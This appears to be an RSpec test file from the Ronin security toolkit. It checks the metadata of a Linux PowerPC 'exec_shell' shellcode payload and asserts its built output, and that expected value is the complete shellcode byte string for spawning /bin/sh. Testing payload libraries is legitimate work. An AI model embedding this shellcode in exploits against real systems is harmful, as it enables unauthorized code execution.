require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/ppc/exec_shell'

describe Ronin::Payloads::Shellcode::Linux::PPC::ExecShell do
  it "must inherit from Ronin::Payloads::Shellcode::ExecShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ExecShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/ppc/exec_shell'" do
      expect(subject.id).to eq('shellcode/linux/ppc/exec_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :ppc" do
      expect(subject.arch).to be(:ppc)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x7c\x3f\x0b\x78\x7c\xa5\x2a\x79\x42\x40\xff\xf9\x7f\x08\x02\xa6\x3b\x18\x01\x34\x98\xb8\xfe\xfb\x38\x78\xfe\xf4\x90\x61\xff\xf8\x38\x81\xff\xf8\x90\xa1\xff\xfc\x3b\xc0\x01\x60\x7f\xc0\x2e\x70\x44\xde\xad\xf2/bin/shZ".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
